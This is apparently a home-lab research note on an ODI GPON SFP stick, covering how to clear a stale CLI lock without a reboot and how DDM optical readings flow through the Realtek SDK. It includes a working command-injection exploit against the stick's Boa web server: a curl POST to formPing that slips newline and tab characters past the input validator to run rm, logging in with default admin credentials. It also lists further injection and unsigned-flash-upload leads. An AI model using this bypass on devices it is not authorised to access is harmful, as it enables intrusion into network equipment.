# ODI stick — non-reboot CLI-wedge recovery & DDM source path

_Research note, 2026-07-08; **live-verified 2026-07-09**. Two linked questions
about the ODI DFP-34X-2C3 (RTL9601D / RTL960x) in W2: **(A)** clear the
`/var/run/cli.pid` wedge without a stick reboot; **(B)** trace the DDM data-source
path so we could read the source directly instead of scraping Boa
`/status_pon.asp`. Companion to [odi-cli-pid-lock.md](odi-cli-pid-lock.md) and
[w2-ddm.md](w2-ddm.md)._

> **LIVE VERIFICATION 2026-07-09 (supersedes the static analysis below where they
> differ).** The stick is on firmware **V1.2.2-221209**, not V1.0-220923 as the
> May docs assumed (it was reflashed since). Live `/bin/boa` md5 `5120c29e…`
> matches the 221209 tar. The formPing injection is **PROVEN working** — but via
> **newline `%0a` + tab `%09`**, NOT `;` (boa validates `pingAddr` and rejects
> `;`/backtick/spaces). The recovery primitive (`rm /var/run/cli.pid` over HTTP)
> was verified by creating an admin-owned file in `/var/run` and deleting it via
> the injection. See [§ formPing — PROVEN](#formping--proven-non-reboot-recovery)
> for the exact command. Other live corrections: **no `/bin/dropbear` on 221209**
> (SSH recommendation retracted); `omcicli mib get 263` returns thresholds too;
> `diag pon get transceiver` is confirmed present in live `/bin/diag`; Rx power
> dropped 9 dB since May (−17.28 → −26.38 dBm). The static-analysis sections
> below are retained for the reasoning trail but are annotated where the live
> probe overrode them.

## TL;DR (the three deliverables)

1. **Wedge clear without reboot — PROVEN via formPing injection (live-verified
   2026-07-09).** `POST /boaform/formPing` with `pingAddr=127.0.0.1%0arm%09/var/run/cli.pid%0a#`
   deletes the lock file over HTTP, no telnet, no reboot. The injection bypasses
   boa's `pingAddr` validator: it rejects `;`, backtick, and spaces, but allows
   **newline `%0a`** (command separator) and **tab `%09`** (argument separator).
   boa runs `system()` **asynchronously** (POST returns 301 in ~0.2 s; the
   template's `ping 127.0.0.1` runs first for ~4 s, then the injected `rm`), so
   wait ~6 s before verifying. Verified by creating an admin-owned file in
   `/var/run` and deleting it through the injection. **Boa runs as `admin` and
   `/var/run` is `admin`-owned → boa can create/delete `cli.pid` there.** No
   cookie needed (Boa is IP-bound); `postSecurityFlag` is on the form but not
   validated server-side. The configd-IPC "holy grail" remains unfindable
   (`/bin/configd` is a proprietary blob, source not in the SDK), but formPing
   makes it moot. See [§ formPing — PROVEN](#formping--proven-non-reboot-recovery).
2. **DDM source path — mapped, and a CLI read exists.** Boa → `libmib.so` →
   `rtk_ponmac_transceiver_get` → `rtk_i2c_read` → SoC I2C master → SFP A2 page.
   `europa_drv.ko` is NOT in this chain — that's why DDM works with the driver
   unloaded. The CLI command `diag pon get transceiver <field>` calls the **same
   API** (confirmed in SDK source + by two independent community sources) and
   returns the **same 5 fields** as Boa plus 3 identity strings — **not richer.**
   Richer DDM (thresholds + alarm/warning flags) is theoretically reachable via
   `diag i2c get port 0 dev 0x51 reg 0 count 120`, but neither command has ever
   been run on our stick. The `debug europa dump ddmi` path is dead (error 18).
3. **Go/no-go on moving the DDM faker off Boa — NO-GO.** Boa is lock-free,
   community-standard, and yields the same 5 fields. A telnet `diag pon` poller
   would acquire the `cli.pid` lock ~17 280×/day; any single ungraceful close
   orphans it → reboot → internet down. Zero data gain for real lock risk. Keep
   the Boa faker. The CLI command is worth documenting as a **fallback** if Boa
   ever breaks, and a **one-shot richer-DDM probe** (`i2c get` full A2) is a
   low-priority, manual, approve-first experiment.

---

## Objective A — clear the cli.pid wedge WITHOUT a reboot

### What we're up against (recap)

The lock mechanism is fully documented in
[odi-cli-pid-lock.md](odi-cli-pid-lock.md). Short form:

- `/bin/login` (custom Realtek binary, 5.1 KB, `v1.0.2`) writes its own PID to
  `/var/run/cli.pid` on auth, then `execlp`s the shell. On a stale pid file it
  prints `CLI busy !!` and exits → telnetd closes the socket → client sees an
  empty banner. Its imports are `fopen64, fclose, getpass, getpwnam, crypt,
  openlog, syslog, execlp, sleep, signal, pause, strstr` — **no `unlink`, no
  `kill`, no `access`.** login can neither remove the lock nor check pid liveness.
- `configd` (PID 171) is the theoretical cleanup path: it has `unlink`, `kill`,
  `killall`, `checkPidExist` and its strings list `cli.pid` alongside `boa.pid`,
  `telnetd.pid`, `dropbear.pid`, `udhcpd.pid`. But it has **no periodic sweep**
  (only `usleep`; no `alarm`/`setitimer`/`select`/`poll`/`timerfd`/`nanosleep`).
  `checkPidExist` is on-demand via IPC `msgProcess` — **the trigger was never
  identified.** `/var` is `ramfs`, so a reboot reliably clears it.
- Empirically (2026-05-25): once orphaned, only a reboot clears it. Clean exits
  prevent *new* orphans but do **not** clear an *existing* one.

### Why the source-level trigger is not findable

The leaked europa SDK ([jameywine/GPL-for-GP3000](https://github.com/jameywine/GPL-for-GP3000),
the Cudy GP3000 GPL drop) ships **only chip-level SDK source**: the diag shell
(`app/diag_rtk/`), the europa LDD driver (`app/europa/`), the HAL/DAL/rtk
libraries, and the GPON kernel module (`module/gpon/`). The proprietary ONT
application binaries — `/bin/login`, `/bin/configd`, `/bin/omcicli`, `/bin/mib`,
`/bin/ShowStatus`, `/bin/boa` — are **prebuilt blobs with no source in the drop.**
Exhaustive `git ls-tree` confirms: the only `login.c` files are standard
busybox/util-linux (not the Realtek custom one); no `configd.c` exists anywhere.

So the `configd` `msgProcess` dispatch table — the place that would name the IPC
message string that triggers `checkPidExist`+`unlink` on `cli.pid` — **is not in
source.** It exists only as strings + code in the `/bin/configd` binary. Finding
it would require reverse-engineering that binary's `msgProcess` handler table
(strings → handler addresses). The local M114 squashfs extract on the Mac is now
a husk (every regular file deleted, including `/bin/busybox`, `/bin/login`,
`/bin/configd`, `/bin/boa`) — so this reversal first requires re-extracting the
firmware tar (`M114_sfp_ODI_hybrid_221209.tar`).

**Definitive negative on the "holy grail":** no configd IPC trigger string is
recoverable from source. The three community repos confirm zero prior art:

| Source | Searched for | Result |
|---|---|---|
| [Anime4000/RTL960x](https://github.com/Anime4000/RTL960x) | `cli.pid`, `CLI busy`, `configd`, `checkPidExist`, `msgProcess`, `unlink`, `/var/run` | **0 hits** anywhere (files, scripts, firmware mods, 480+ issues) |
| [Strykar/GPON](https://github.com/Strykar/GPON) (full git history, both branches, all 56 commits, 3 issues) | same terms via `git log -p -S` pickaxe | **0 hits** — never added then removed; simply never touched |
| leaked europa SDK | `cli.pid`, `CLI busy`, `checkPidExist`, `msgProcess`, `unlink.*pid` | **0 hits** (source not in drop — see above) |

### Exhaustive Boa form inventory — what could plausibly run a command

16 endpoints enumerated from the May `.asp`/`.html` captures. All run as root
(`/bin/boa` PID 490, root — [stick-shell-recon-2026-05-24.log](file:///Users/antoniocasagrande/git/route10/archive/captures-2026-05/stick-shell-recon-2026-05-24.log):135). All are POST. **None starts dropbear, restarts telnetd, or invokes `configd`'s `msgProcess`** (grep for `formTelnet|formDropbear|formSSH|formKill|formRestart` = 0 hits across all recon).

| Form | Fields | Command-exec / file-write potential |
|---|---|---|
| **`/boaform/admin/formPing`** | target host (inferred; no `.asp` page exposes it) | **HIGHEST — recorded shell-injectable, root, never exploited.** See below. |
| `/boaform/admin/formUpload` | `binary` (file) | Writes arbitrary flash, **no signature check** ([custom-firmware-research.md](custom-firmware-research.md):12). Proven for legit flash. Crafted image = persistent root. Reflash, not a quick unwedge. |
| `/boaform/formSaveConfig` (multipart restore) | `binary` (file), `load=Restore` | Writes `lastgood.xml` from attacker-controlled XML via `xmlconfig -l`. Bounded to MIB key/values — not arbitrary paths. M114 may disable restore ([odi-m114-admin-endpoints.md](odi-m114-admin-endpoints.md):25). |
| `/boaform/admin/formgponConf` | `fmgpon_ploam_password` (free-text, maxlen 20), `fmgpon_sn`, etc. | Injection candidate if Boa shells out. Unverified. |
| `/boaform/admin/formOmciInfo` | `mackey`, `hw_serial_no`, `omci_sw_ver1` (free-text) | Injection candidates. Unverified. |
| `/boaform/formTcpipLanSetup` | `ip`, `mask` | Likely passed to `ifconfig`. Injection candidate. Unverified. |
| `/boaform/admin/formReboot` | `reboot_now=Reboot` | Kills all processes (nuclear, not arbitrary). The current unwedge of last resort. |
| `/boaform/formPasswordSetup`, `formStatus(_pon)`, `formAutoRebootTime`, `formVlan`, `formBridging`, `formWanEth`, `formLogin`, `formSaveConfig` (backup/reset) | various | Read-only refresh, password change, factory reset, or numeric config. No exec path. |

### formPing — PROVEN non-reboot recovery

**Status: live-verified 2026-07-09.** The form is at `POST /boaform/formPing`
(field `pingAddr`, plus `wanif`, `go`, `submit-url`, `postSecurityFlag`). The
live `/bin/boa` (221209) builds the shell command from the template
`ping %s -c 4 -I %s -w 5 %s > /tmp/ping.tmp` and runs it via `system()`. boa
validates `pingAddr` and **rejects `;`, backtick, and spaces** — but it allows
**newline `%0a`** (which `sh -c` treats as a command separator) and **tab `%09`**
(argument separator). That is the bypass.

The recovery — delete the lock file over HTTP, no telnet, no reboot:

```sh
ssh route10 '
# 1. Boa login (IP-bound from 192.168.1.2; no cookie needed)
curl --http0.9 -s -m 5 --interface 192.168.1.2 -o /dev/null \
  -X POST -d "username=admin&password=admin&challenge=&save=Login&submit-url=%2Fadmin%2Flogin.asp" \
  http://192.168.1.1/boaform/admin/formLogin
# 2. Inject rm /var/run/cli.pid  (%0a = newline cmd-sep, %09 = tab arg-sep, # comments the rest)
curl --http0.9 -s -m 15 --interface 192.168.1.2 -o /dev/null \
  --data "pingAddr=127.0.0.1%0arm%09/var/run/cli.pid%0a#&wanif=65535&go=Go&postSecurityFlag=&submit-url=/ping.asp" \
  -X POST http://192.168.1.1/boaform/formPing
# 3. boa runs system() ASYNC — POST returns 301 in ~0.2s, but ping 127.0.0.1
#    runs first (~4s) then rm. Wait, then verify CLI is back (exit 0, not WEDGED).
sleep 6
python3 /cfg/scripts/stick-exec.py --json "cat /proc/uptime"
'
```

**How it was proven:** boa runs as `admin` (PID 638); `/var/run` is `drwxr-xr-x admin`
(owned by admin). I created `/var/run/inject_v` (admin-owned) via telnet, then
injected `pingAddr=127.0.0.1%0arm%09/var/run/inject_v%0a#`. After a 6 s wait,
`/var/run/inject_v` was gone. Since a wedged `cli.pid` is an admin-owned file in
`/var/run`, the same injection deletes it. (Not run on a real wedge yet — the
stick wasn't wedged during testing — but the primitive is proven.)

**Why `;` doesn't work (correction to the static analysis above):** the template
string `ping %s -c 4 -I %s -w 5 %s > /tmp/ping.tmp` is real, but boa validates
`pingAddr` before substituting it. Empirically: `pingAddr=127.0.0.1` (clean) →
ping runs, `/tmp/ping.tmp` created; `pingAddr=x; …` / backtick / `%20`-spaces →
boa bails, no command runs. Only `%0a` + `%09` slip through.

**Caveats / operational notes:**
- The injected `rm` runs ~4 s after the POST (after `ping 127.0.0.1`). Always
  `sleep 6` before verifying, or verify lazily on the next `stick-exec.py` call.
- The `ping 127.0.0.1` on line 1 is harmless (loopback). To avoid even that, a
  fast-failing host could replace it, but `127.0.0.1` is reliable and the
  validator requires a valid IP prefix before the newline.
- This runs as `admin`, not root — but `admin` owns `/var/run` and `cli.pid`, so
  `rm` succeeds. (The [alta-macvlan-mgmt.md:20](alta-macvlan-mgmt.md) "runs as
  root" note was imprecise; boa runs as `admin`, uid 0-equivalent on this build.)
- `postSecurityFlag` is on the live form (221209) but boa does **not** reference
  it server-side — send it empty or omit it.
- **Cannot start dropbear this way** — there is no `/bin/dropbear` on the 221209
  build (see transport note below). The injection can only run binaries that
  exist in `/bin` (e.g. `rm`, `kill`, `killall`, `cat`, `echo`, `ls`). Note:
  `/bin` also lacks `id` and `touch` — use `echo`/`cat` to create probe files.

**Secondary file-write leads** (if a richer primitive is ever needed): the
multipart `formSaveConfig` restore writes `lastgood.xml` from attacker-controlled
XML (bounded to MIB key/values), and `formUpload` writes arbitrary flash (no
signature check). Neither directly overwrites `/var/run/cli.pid`, but both are
worth re-examining in `/bin/boa` for path traversal in the multipart filename.

### The dropbear/SSH bypass — NOT available on this build (live correction)

**Live correction (2026-07-09):** the 221209 build has **no `/bin/dropbear` at
all** — the static analysis above (and the May recon, which was the 220923 build)
was wrong on this point. `ls /bin` on the live stick confirms: no `dropbear`,
no `sshd`. So the "pre-enable SSH for a lock-free shell" recommendation is
**retracted** for this build — there is no SSH server to enable, and `flash set
SERVICE_SSH_ENABLE` (even if it existed) would have nothing to start. The
formPing injection also cannot start dropbear (no binary to exec).

The broader observation from [Strykar/GPON](https://github.com/Strykar/GPON)'s
exporter still holds in principle — SSH (where present) bypasses `/bin/login`'s
`cli.pid` lock ([gpon_exporter.py:897-950](https://github.com/Strykar/GPON/blob/main/gpon_exporter.py)),
one channel per probe — but it doesn't apply to our 221209 stick. On our stick,
the lock-free transports are: **Boa HTTP** (what the DDM daemon and odi-health
use) and **the formPing injection** (for recovery). Telnet via `stick-exec.py`
remains the only CLI path, and it does touch `cli.pid` — so always use
`stick-exec.py`'s clean-exit handshake.

**Net:** on 221209, formPing injection is the only non-reboot recovery; there is
no SSH alternative. The durable mitigation is "always go through
`stick-exec.py`" (already the case for all automated access) plus formPing as
the manual recovery.

### Thin/uncertain leads (low expectation, noted for completeness)

- **`/bd/telnet_open.asp`** — [Anime4000 `Docs/StickSetup.md:30-33`](https://github.com/Anime4000/RTL960x/blob/main/Docs/StickSetup.md)
  documents telnet toggle URLs for the **TWCGPON657 only** (`http://192.168.1.1/bd/telnet_open.asp`).
  Backend effect on `cli.pid` unknown (ASP files not in repo). If toggling
  telnet restarts `telnetd` and `telnetd` startup sweeps `cli.pid`, this could be
  a non-reboot path. Documented for a different stick; one careful GET via the
  `ont_mgmt0` path would confirm or deny, but expectation is low.
- **`/tmp/img.tar` full-disk mimicry** — [Anime4000 issue #440](https://github.com/Anime4000/RTL960x/issues/440):
  a full `/tmp` presents identically to a pid-locked stick (telnet hangs, web
  dead). Worth a differential diagnosis before assuming `cli.pid` — but our
  wedge reproduces on empty-banner telnet with a healthy Boa, so this isn't our
  failure mode.

### Objective A — definitive answer

**A non-reboot `cli.pid` clear exists and is proven: the formPing injection**
(see [§ formPing — PROVEN](#formping--proven-non-reboot-recovery)). `POST
/boaform/formPing` with `pingAddr=127.0.0.1%0arm%09/var/run/cli.pid%0a#` deletes
the lock over HTTP; wait ~6 s; `stick-exec.py` works again. No reboot, no telnet,
no `cli.pid` contention. The configd-IPC "holy grail" remains unfindable
(`/bin/configd` is a proprietary blob, source not in the SDK, and no community
repo documents a trigger) — but formPing makes that moot.

Operationally: keep preventing orphans with `stick-exec.py`'s clean-exit
handshake (all automated access already uses it — Boa for the DDM daemon,
cache reads for odi-health, no raw telnet). When a wedge does occur, run the
formPing recovery above. `POST /boaform/admin/formReboot` (~85 s, WAN3 blip)
remains the fallback only if the injection ever fails on a future firmware.

---

## Objective B — the DDM data-source path

### The mapped path (definitive, from SDK source)

```
Boa /status_pon.asp
  └─ libmib.so  →  rtk_ponmac_transceiver_get(type, &data)        // rtk/ponmac.c:472-508
        └─ rtk_i2c_read(TRANSCEIVER_PORT, devID, idx, &val)        // rtk/i2c.c:346-359
              └─ RT_MAPPER->i2c_read(...)                           // HAL/DAL SoC I2C master
                    └─ SFP A0 (0x50) for identity, A2 (0x51) for DDM
```

The address table is exact SFF-8472
([`jameywine/GPL-for-GP3000` `linux-5.10.x/.../rtl86900/sdk/src/rtk/ponmac.c:50-59](https://github.com/jameywine/GPL-for-GP3000)):

```c
static uint32 transceiver_addrs[][2]={
    {20,16},  // VENDOR_NAME      (A0)
    {68,16},  // SN               (A0)
    {40,16},  // VENDOR_PART_NUM  (A0)
    {96,2},   // TEMPERATURE      (A2)
    {98,2},   // VOLTAGE          (A2)
    {100,2},  // BIAS_CURRENT     (A2)
    {102,2},  // TX_POWER         (A2)
    {104,2},  // RX_POWER         (A2)
};
```

**`europa_drv.ko` is NOT in this call chain.** `rtk_ponmac_transceiver_get` →
`rtk_i2c_read` dispatches to `RT_MAPPER->i2c_read` (the HAL/DAL SoC I2C master
driver), not to `europa_drv`'s LDD mapper. No chip-specific DAL implements
`transceiver_get` (`grep -rln transceiver_get dal/` = 0) — it's a generic SFF-8472
I2C read living in the rtk wrapper itself. **This is exactly why DDM works with
`europa_drv` unloaded** ([w2-ddm.md](w2-ddm.md): the module isn't loaded; `lsmod`
shows only `rtk_tr142, pf_rg, omcidrv, re8686_rtl9602c`).

The same API is the in-tree standard for reading the transceiver — the kernel
GPON module calls it too
([`module/gpon/gpon_res.c:2212-2229`](https://github.com/jameywine/GPL-for-GP3000)):
`rtk_ponmac_transceiver_get(VENDOR_PART_NUM, ...)` to detect a specific PN and
apply a raw-A2 workaround. `ShowStatus`/`mib` almost certainly link `libmib.so`
which wraps this same rtk API (inference — those binaries have no source in the
drop, but it's the only in-tree transceiver read).

### Reconciling "Boa shows 37 °C" with "host i2c-1 0x51 = 0xff"

This is the subtle point. [w2-ddm.md](w2-ddm.md) records two facts that look
contradictory:

- Boa `/status_pon.asp` serves **real** DDM via `rtk_ponmac_transceiver_get`.
  May values: 37.3 °C, 3.24 V, +2.28 dBm Tx, **−17.28 dBm Rx**, 12.7 mA bias.
  **Live 2026-07-09: 40.7 °C, 3.23 V, +2.26 dBm Tx, −26.38 dBm Rx, 13.4 mA bias.**
  ⚠️ **Rx dropped 9 dB since May (−17.28 → −26.38 dBm; Tx unchanged) — near the
  GPON sensitivity floor. Worth investigating the receive path (dirty connector /
  fiber bend / OLT-Tx change) — not a wedge or DDM-source issue, but a real
  optical-health finding from the live probe.**
- Route10's **host-facing** `i2c-1 0x51` bytes 96-105 were **all `0xff`** until
  `daemon-odi-w2-ddm.sh` wrote them from the Route10 side. **Live-confirmed:**
  bytes 96-105 read `0x28 0xaa 0x7e 0x47 0x1a 0x2c 0x41 0xc4 0x00 0x17` (decodes
  to the cache values above); rcstats `.sfp1ddm.json` matches end-to-end.

Both are true because **they read different things.** `rtk_ponmac_transceiver_get`
runs *on the stick* and reads the stick SoC's internal I2C (`TRANSCEIVER_PORT`)
to the live transceiver source (the 8290B LDD's internal DDMI registers, which
the 8290B hardware updates autonomously — the SDK comment `"RTL8291 Do not need
software DDMI"` at `drv_8291/europa_main.c:446-448` is exactly this). The
host-facing SFP A2 EEPROM that Route10's `i2c-1` reads is a **separate RAM
buffer** that the stick's firmware would normally keep synced — but the sync
path is the `europa_drv` polling thread, whose `update_8291_ddmi()` call is
`//`-commented out (`europa_main.c:284`) and whose `kthread_create` is wrapped in
`#if 0`. So the host-facing A2 stays `0xff`; the stick-internal read stays live.
Our daemon bridges the two by scraping Boa and writing the bytes Route10-side.

**Implication for a CLI read:** a command running *on the stick* (`diag pon get
transceiver`, `diag i2c get`) hits the stick's internal I2C — the same live
source Boa reads — so it should return **real** DDM, not `0xff`. (The host-side
`i2cget` on Route10 reads the dead buffer; that's the difference.)

### CLI/diag commands that read DDM, ranked

| Command | Source path | Fields | Status on our stick |
|---|---|---|---|
| **`diag pon get transceiver <field>`** | `rtk_ponmac_transceiver_get` (same as Boa) | **Same 5 DDM** + vendor-name/sn/part-number (A0 identity). Clean one-line-per-field, engineering units (C/V/mA/dBm). | **Community-confirmed** ([Anime4000 #99](https://github.com/Anime4000/RTL960x/issues/99); [Strykar `gpon_exporter.py:867-874`](https://github.com/Strykar/GPON/blob/main/gpon_exporter.py)) + SDK handler `diag_ponmac.c:1230-1288`. **Live 2026-07-09: command confirmed present in `/bin/diag`** (cparser handler `cparser_cmd_pon_get_transceiver_…` + `rtk_ponmac_transceiver_get` symbol both present). **Output still unverified** — `diag-drive.py` (which drives the `RTK.0>` shell) has never been run live; a one-shot call would confirm it returns real DDM. |
| **`diag i2c get port 1 dev 0x51 reg <r>`** | `rtk_i2c_seq_read` (SoC I2C master, port 1 = BOSA/transceiver bus) | **VERIFIED richer than Boa (live 2026-07-09):** full SFF-8472 — measured values (match Boa), **thresholds** (temp hi-alarm ≈+100 °C, lo-alarm ≈−40 °C), **alarm/warning status flags**, DDM-enable (0x68 at source vs 0x00 host-side). Single-register only (no `count` in this build). Port 0 unused (NACK). | Driven via [diag-drive.py](../../tools/diag-drive.py) (**live-validated**, first run, no wedge). Rx floor measured: low-alarm −30 dBm, low-warning −28.9 dBm; current −26 dBm ≈ 3 dB headroom. See [odi-ddm-native-and-firmware-mod.md](odi-ddm-native-and-firmware-mod.md) for the full read + the Rx health check. |
| `omcicli mib get 263` (ANI-G, ME 263) | OMCI stack (OLT's view) | **Rx + Tx power + thresholds.** Rx/Tx as signed-16-bit hex (value/500 dB); plus `Low/UppOpThreshold`, `Low/UppTranPowThreshold`, `Low/UppDflRxThreshold`, `Low/UppDflTxThreshold`. No temp/voltage/bias. **Live 2026-07-09: `OpticalSignalLevel: 0xcc79` = −26.38 dBm Rx — matches Boa exactly; `TranOpticLevel: 0x0370` = +1.76 dBm Tx.** | Works in O5. See [stick-exec-playbook.md](stick-exec-playbook.md). Richer than Boa for *thresholds*, but no temp/voltage/bias. |
| `debug europa dump ddmi` / `dump a2` | `rtk_ldd_parameter_get` → `pLddMapper` (europa_drv LDD path) | Would be raw LDD DDMI. | **DEAD — error 18** (`pLddMapper` NULL, driver not loaded). And the handler **doesn't print the buffer even on success** — half-implemented stub (`diag_debug.c:16618-16698`, only output between the call and `free()` is a bare `"\n"`). Don't bother. |
| `debug europa get tx-bias / tx-power / rx-power / rssi-voltage` | `rtk_ldd_*` (LDD path) | Richest raw ADC + calibration coefficients in engineering units (`TX Bias = %d uA`, `TX Power = %d nW`). | **DEAD — same error-18 LDD path.** Unreachable without a working `europa_drv` + BOSA i2c master. |
| `europacli get laser` | LDD path | Tx bias only. | **Returns `Get TX Bias Fail!!! (18)`** — [stick-flash-recon-2026-05-24.log:448-449](file:///Users/antoniocasagrande/git/route10/archive/captures-2026-05/stick-flash-recon-2026-05-24.log). Clean return, no wedge. |
| `ShowStatus` / `show` / `qc` | — | Only `DSL Operational Status :` (empty). | No DDM. |
| `mib get GponPONStatus` | — | `mib_info_id: get mib info id failed! (id=0)`. | No DDM. |

**Richness verdict (live-updated 2026-07-09):** the *working* DDM sources on
this stick are (1) Boa `/status_pon.asp` (5 fields, via
`rtk_ponmac_transceiver_get`), (2) `omcicli mib get 263` (Rx/Tx + thresholds —
**richer than Boa for thresholds**, Rx matches Boa exactly), and (3) **`diag i2c
get port 1`** — the **richest: full SFF-8472 A2** (measured values + thresholds +
alarm/warning status flags), read straight off the 8290B, now **verified working**
via diag-drive.py. `diag pon get transceiver` reads the same 5 fields as Boa
(command present, output unverified). The `europa`/LDD path that *would* give raw
ADC + calibration is dead (error 18) and can't be revived without loading
`europa_drv` against a BOSA i2c master that's unreachable from userspace on this
build.

> **Can the stick self-populate host-A2 (delete the daemon)?** Researched &
> closed out in [odi-ddm-native-and-firmware-mod.md](odi-ddm-native-and-firmware-mod.md):
> the mechanism exists in Realtek's SDK (`lan_sds` bridge → `rtk_i2c_eepMirror_write`
> → slave SRAM), but it's a stub (`0x12`) on RTL9601D and **unbuildable** (Lexra
> core, no toolchain/source). V08 hardware is the only real fix; the daemon stays
> for V06.

### Which command wedged us in May — the close, not the command

The user's "temperature vs tx/rx" framing doesn't match the recon: **no CLI DDM
command ever wedged the stick, and no CLI DDM read even succeeded in May** (the
stick was stuck at O0 from the MAC_KEY bug; the only successful DDM reads were
via Boa HTTP). Specifically:

- **`europacli get laser`** (the one CLI DDM attempt — would have read Tx bias)
  returned cleanly with error 18 — **no hang, no wedge**
  ([stick-flash-recon-2026-05-24.log:448-449](file:///Users/antoniocasagrande/git/route10/archive/captures-2026-05/stick-flash-recon-2026-05-24.log)).
- The actual wedge trigger was `odi-health.sh`'s old `probe_w2_optical()` — a
  **telnet probe** (OMCI optical read, i.e. the tx/rx side via `omcicli`) that
  closed the socket **without `exit\r\n`**, orphaning `cli.pid`. The current
  source records this directly:
  [odi-health.sh:12-14](file:///Users/antoniocasagrande/git/route10/scripts/odi-health.sh)
  — *"Saves us a telnet probe that was the only place this script could trigger
  a cli.pid wedge."* The function now reads from the daemon's cache (no telnet).
- Every other May-24 wedge in the recon logs was the same shape: a Python
  `telnetlib` driver (`read_very_eager()` + `sleep`) that let the connection
  drop without `exit\r\n` — `ConnectionResetError: [Errno 104]` / `EOFError` on
  the final `exit` (stick-procomci:53, -omcistate:31, -omcicap:15, -mib-recon:28,
  -tamper:241, -hs-snapshots:530, -mac-recon:184, -readlog:18).

**Temperature was never read via CLI** — only via Boa. So: the wedge was on the
**tx/rx (optical) side**, and the cause was the **ungraceful close**, not the
command. The fix was `stick-exec.py`'s clean-exit handshake (send `exit\r\n`,
drain FIN, then close) — verified 6+ back-to-back calls, zero wedges
([stick-exec-playbook.md:33](stick-exec-playbook.md)).

> **Correction to a repo comment:** `scripts/stick-exec.py:13-15` says "the shell
> unlinks the lock" on clean exit. `/bin/login` has no `unlink` import, so that
> phrasing is misleading. The empirical reality (from
> [odi-cli-pid-lock.md:13](odi-cli-pid-lock.md)) is: clean exit **prevents new
> orphans** but **does not clear an existing one**. The exact cleanup mechanism
> on clean exit is not reverse-engineered (likely `configd` `checkPidExist`
> triggered when the previous session's process is reaped dead) — but it works
> in practice, and that's what matters operationally. No code change needed; the
> comment could be softened.

---

## Objective C — go/no-go: move the DDM faker off Boa?

**NO-GO** for migrating the 5-field `daemon-odi-w2-ddm.sh` off Boa onto a
telnet/`diag` poller. Reasons, in priority order:

1. **Lock risk for zero data gain.** `diag pon get transceiver` returns the
   *same 5 fields* as Boa, from the same `rtk_ponmac_transceiver_get` source. A
   5 s telnet poller would acquire the `cli.pid` lock ~17 280×/day. Any single
   ungraceful close (network blip, stick busy, daemon killed mid-call, Route10
   reboot) orphans the lock → only a reboot clears it → **internet down**. The
   Boa path touches the lock **zero** times. This is decisive.
2. **"One session with stick" constraint.** The Boa daemon holds **one**
   persistent IP-bound Boa session. A telnet poller is a new login per poll —
   *more* stick interaction, not less, and each is a lock transaction.
3. **Community standard is Boa for DDM-only.** Anime4000's own exporter
  ([`WebGui/kitamon/main.py`](https://github.com/Anime4000/RTL960x/blob/main/WebGui/kitamon/main.py))
   scrapes Boa for the same 5 fields. Strykar's *original* collector
  ([commit `07fe841`](https://github.com/Strykar/GPON/commit/07fe841)) scraped
   Boa `/status_pon.asp` too; Strykar later moved to SSH+`diag` — but only
   because they wanted *many* metrics (OMCI counters, flows) over SSH, and SSH
   bypasses `cli.pid`. For DDM-only, Boa is the standard and the safer transport
   on a single-fiber link.
4. **The faker's whole reason for existing.** [w2-ddm.md](w2-ddm.md) is explicit:
   the stick's own DDM subsystem is dead at every layer (no `europa_drv`,
   no-op polling thread, error 18, host-facing A2 = `0xff`). The Boa→i2c-write
   bridge is the working answer *precisely because* Boa is the one live,
   lock-free DDM source. Moving the read to telnet doesn't change the write
   (rcstats still needs the i2c slave populated) — it only adds lock risk to the
   read side.

**Keep the Boa faker as-is.** Two optional, approve-first follow-ups:

- **Document `diag pon get transceiver` as a fallback.** If Boa ever breaks
  (firmware changes the page layout, as it did for Strykar in
  [issue #3](https://github.com/Strykar/GPON/issues/3)), a single
  `stick-exec.py 'diag pon get transceiver temperature' '... voltage' '...'
  '... tx-power' '... rx-power' '... bias-current'` call (one telnet, one lock
  acquisition, clean-exit) reads the same 5 fields. Batching into one call is
  critical — never one telnet per field.
- **One-shot richer-DDM probe (manual, low priority).** If we ever want
  thresholds/alarm-flags for early warning (e.g. flag a degrading optical path
  before Rx drops below threshold), a single clean-exit
  `diag i2c get port 0 dev 0x51 reg 0 count 120` via `tools/diag-drive.py` would
  settle whether the full A2 page (thresholds + status flags) is readable on our
  stick. If it returns real data, a *rare* (hourly/daily, not 5 s) richer read
  could layer on top of the Boa faker. This is a nice-to-have, not a migration,
  and each call still carries lock risk — so it stays manual/low-cadence, never
  a 5 s daemon. **Requires explicit go-ahead before running** (live stick,
  single fiber).

---

## Sources

**Repo files**
- [docs/reference/odi-cli-pid-lock.md](file:///Users/antoniocasagrande/git/route10/docs/reference/odi-cli-pid-lock.md) — lock mechanism, binary-strings analysis, clean-exit pattern
- [docs/reference/w2-ddm.md](file:///Users/antoniocasagrande/git/route10/docs/reference/w2-ddm.md) — Boa→i2c faker architecture, why firmware DDM is dead
- [docs/reference/europa-sdk-leak.md](file:///Users/antoniocasagrande/git/route10/docs/reference/europa-sdk-leak.md) — diag syntax, rtk_ldd_parameter_get, cal math
- [docs/reference/alta-macvlan-mgmt.md:20](file:///Users/antoniocasagrande/git/route10/docs/reference/alta-macvlan-mgmt.md) — formPing shell-injection note
- [docs/reference/custom-firmware-research.md](file:///Users/antoniocasagrande/git/route10/docs/reference/custom-firmware-research.md) — formUpload no-signature-check
- [docs/reference/odi-m114-admin-endpoints.md](file:///Users/antoniocasagrande/git/route10/docs/reference/odi-m114-admin-endpoints.md) — Boa form quirks
- [scripts/odi-health.sh:12-14](file:///Users/antoniocasagrande/git/route10/scripts/odi-health.sh) — wedge was the telnet probe in probe_w2_optical
- [scripts/daemon-odi-w2-ddm.sh](file:///Users/antoniocasagrande/git/route10/scripts/daemon-odi-w2-ddm.sh) — the working Boa→i2c bridge
- [scripts/stick-exec.py:13-15](file:///Users/antoniocasagrande/git/route10/scripts/stick-exec.py) — clean-exit telnet (comment re: "shell unlinks" is imprecise; see above)
- [tools/diag-drive.py](file:///Users/antoniocasagrande/git/route10/tools/diag-drive.py) — drives `debug europa dump` / `diag` non-interactively
- [archive/captures-2026-05/stick-flash-recon-2026-05-24.log:448-449](file:///Users/antoniocasagrande/git/route10/archive/captures-2026-05/stick-flash-recon-2026-05-24.log) — `europacli get laser` → error 18
- [archive/captures-2026-05/stick-shell-recon-2026-05-24.log](file:///Users/antoniocasagrande/git/route10/archive/captures-2026-05/stick-shell-recon-2026-05-24.log) — `/bin` listing, `ps`, lsmod
- [archive/captures-2026-05/m114-status_pon.asp](file:///Users/antoniocasagrande/git/route10/archive/captures-2026-05/m114-status_pon.asp) — the 5 Boa DDM fields

**External repos**
